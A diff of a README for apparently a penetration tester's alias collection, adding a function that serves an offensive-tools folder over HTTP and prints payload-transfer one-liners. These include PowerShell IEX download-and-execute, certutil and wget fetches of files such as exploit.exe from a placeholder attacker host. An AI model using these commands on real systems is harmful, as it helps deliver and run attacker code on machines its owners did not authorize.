@@ -4,23 +4,92 @@ This repository contains helpful Linux aliases for tasks like web server provisi
 
 ## Aliases Overview
 
-### 1. Start Provisional Web Server
+### 1. Start Provisional Web Server with Download Commands
 
-This alias quickly spins up a Python HTTP server, providing access to your Offensive Security tools.
+The `pyweb_server` function quickly spins up a Python HTTP server, providing access to your Offensive Security tools and enabling download command generation for convenience.
+
+#### Function Definition
+
+This function allows you to:
+- Start a Python HTTP server on a specified port and directory.
+- Use default settings if only a port is provided.
+- Generate various download commands based on file and directory inputs.
+- Interact with the server using commands such as `download` and `help`.
+
+#### Usage
+
+##### 1. Start the Web Server
+
+To start the web server, you can specify a port and optionally a directory.
 
 ```bash
-alias pyweb='python3 -m http.server -d /home/david/Offensive-Security-Tools/ 8888'
+pyweb_server <port> [directory]
 ```
 
-**Usage:**
+- <port>: The port number to start the HTTP server on.
+- [directory]: The directory to serve (optional). Default is /home/david/Offensive-Security-Tools/.
 
-To start the web server on port 8888, just run:
+Examples:
 
+- To serve the default directory on port 8888:
 ```bash
-pyweb
+pyweb_server 8888
 ```
 
-This will serve files from the /home/david/Offensive-Security-Tools/ directory.
+- To serve a custom directory on port 9000:
+```bash
+pyweb_server 9000 /path/to/your/directory
+```
+
+##### 2. Interactive Commands
+Once the server is running, you can use the following interactive commands:
+
+- download <directory> <file>: Prints download commands for the specified directory and file.
+
+    - Example:
+```bash
+download tools mytool.exe
+```
+
+    - Output:
+```text
+iwr -uri http://<IP>:<port>/tools/mytool.exe -Outfile mytool.exe
+IEX(New-Object Net.Webclient).downloadstring("http://<IP>:<port>/tools/mytool.exe")
+certutil -urlcache -f http://<IP>:<port>/tools/mytool.exe mytool.exe
+wget http://<IP>:<port>/tools/mytool.exe
+```
+
+- download <file>: Prints download commands for the specified file in the root directory.
+
+    - Example:
+```bash
+download mytool.exe
+```
+
+    - Output:
+```text
+iwr -uri http://<IP>:<port>/mytool.exe -Outfile mytool.exe
+IEX(New-Object Net.Webclient).downloadstring("http://<IP>:<port>/mytool.exe")
+certutil -urlcache -f http://<IP>:<port>/mytool.exe mytool.exe
+wget http://<IP>:<port>/mytool.exe
+```
+- help: Displays a help message with available commands.
+- exit: Stops the HTTP server and exits the prompt.
+
+##### 3. Example Workflow
+```bash
+Copiar código
+# Start the server on port 8888
+pyweb_server 8888
+
+# Inside the interactive prompt
+> download tools exploit.exe
+> download mytool.exe
+> help
+> exit
+```
+
+This function makes it easy to quickly serve files and generate download commands for use in various tools and scripts.
 
 ### 2. Directory Enumeration with Dirsearch
 
